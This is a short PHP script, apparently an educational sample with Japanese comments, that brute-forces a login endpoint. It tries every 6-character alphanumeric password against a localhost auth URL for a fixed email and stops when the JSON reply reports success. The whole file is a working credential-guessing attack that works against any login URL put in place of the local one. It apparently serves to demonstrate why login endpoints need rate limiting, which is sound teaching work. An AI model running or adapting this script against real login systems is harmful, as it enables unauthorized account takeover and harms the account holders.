<?php
/**
 * (簡易) Brute Force Attack サンプル
 *
 * @version 1.0.0
 * @author M.Katsube <katsubemakito@gmail.com>
 */

//---------------------------------------
// 定数
//---------------------------------------
define('TARGET_URL', 'http://localhost/login/auth1.php');
define('USER_ID',    'foo@example.com');
define('LOOP_START', 14776336);				// 5桁の62進数のパターン数(10000)
define('LOOP_MAX',   56800235583);			// 6桁の62進数のパターン数(ZZZZZZ)

// 開始時間をメモ
$start = time();

//---------------------------------------
// 総当りスタート
//---------------------------------------
for($i=LOOP_START; $i<=LOOP_MAX; $i++){
	$pw = dec2dohex($i);
	$url = sprintf('%s?email=%s&password=%s', TARGET_URL, USER_ID, $pw);

	// 途中経過を表示
	printf("%11d: %s\n", $i, $pw);

	// APIを叩く
	$buff = file_get_contents($url);
	$json = json_decode($buff, true);

	// 判定
	if( $json['head']['result'] === true ){
		echo "HIT! $pw\n";
		break;
	}
}

//処理時間
echo "Time: ". (time() - $start) ."(sec)\n";


/**
 * 10進数を62進数に変換する
 *
 * @param int $dec 10進数の値
 * @return string
 * @see https://gist.github.com/sunaoka/6362065
 */
function dec2dohex($dec) {
	$hashtable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$result = '';
	while($dec > 0) {
		$result = $hashtable[$dec % 62] . $result;
		$dec = floor($dec / 62);
	}
	return $result;
}